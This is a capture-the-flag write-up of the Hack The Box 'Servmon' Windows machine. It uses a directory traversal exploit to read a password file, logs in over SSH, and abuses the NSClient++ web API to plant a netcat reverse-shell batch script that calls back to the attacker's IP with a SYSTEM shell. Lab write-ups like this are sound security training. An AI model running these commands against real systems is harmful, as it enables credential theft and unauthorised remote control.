---
title: "[HTB] Servmon WriteUp"
date: 2020-06-15T15:34:30-04:00
categories:
  - writeup
tags:
  - HTB
  - Hack The Box
  - WriteUp
---

![](/assets/servmon/servmon.jpg)

* OS: Windows
* Difficulty: Easy
* Points: 20
* Release: 11 Apr 2020
* IP: 10.10.10.184

Lets start by running nmap

```bash
nmap -sC -sV -oN nmap/nmap 10.10.10.184
```

Output:
```bash
# Nmap 7.80 scan initiated Tue May  5 19:41:18 2020 as: nmap -sV -sC -oN nmap/nmap 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.024s latency).
Not shown: 991 closed ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst: 
|_  SYST: Windows_NT
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings: 
|   GetRequest, HTTPOptions, RTSPRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo: 
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL: 
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesnt have a title (text/html).
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5666/tcp open  tcpwrapped
6699/tcp open  tcpwrapped
8443/tcp open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|_    Location: /index.html
| http-title: NSClient++
|_Requested resource was /index.html
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
...
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 4m16s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-05-05T18:47:18
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May  5 19:43:07 2020 -- 1 IP address (1 host up) scanned in 108.77 seconds
```

FTP is running and allows anonymous login.
There are two users listed on the FTP server, Nadine and Nathan. We also find tome text files, "Notes to do".txt and Confidential.txt

Confidential.txt reads 
```
Nathan,

I left your Passwords.txt file on your Desktop.
Please remove this once you have edited it yourself and place it back into the secure folder.

Regards

Nadine
```

The webserver is running NVMS-1000, searching for exploits we find [CVE:2019-20085](https://www.exploit-db.com/exploits/48311) which is a directory traversal. We can use this to find the passwords.txt that the note told us about.

```bash
curl --path-as-is -G http://10.10.10.184/../../../../../../../../Users/Nathan/Desktop/passwords.txt
```

This gives us a list of passwords 

```
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
```

We can try SSH with these passwords against both known users. The password L1k3B1gBut7s@W0rk works with Nadine.

We log in as Nadine and find User.txt on the Desktop.


### PrivEsc

This part took me a long time to do, mostly due to the GUI interface. I eventually done it using the [web API](https://docs.nsclient.org/api/).

Port 8443 is running NSClient++.

We can find the password for NSClient++ by going to C:\Program Files\NSClient++ and using the following command

```bash
nscp web --password --display
Current password: ew2x6SsGTxjRwXOT
```

We can try logging in using this password but it will only allow connections from localhost. SSH has port forwarding built in so log in as Nadine with port forwarding enabled.

```bash
ssh -L 8443:127.0.0.1:8443 Nadine@10.10.10.184
```

Now we can use the web API to add a malicious script and execute it to gain root privileges.

First we need to upload nc.exe to C:/Temp. Then use the following command to add our script.

```bash
curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "C:\Temp\nc.exe 10.10.14.33 9001 -e cmd.exe"
```

When run this will call back to our IP address. Set up a listener on the attacking machine.

```bash
nc -lvnp 9001
```

Then run the script

```bash
curl -s -k -u admin https://localhost:8443/api/v1/queries/evil/commands/execute?time=1m
```

This should connect back and give us root!

Root.txt is in C:\Users\Administrator\Desktop\root.txt


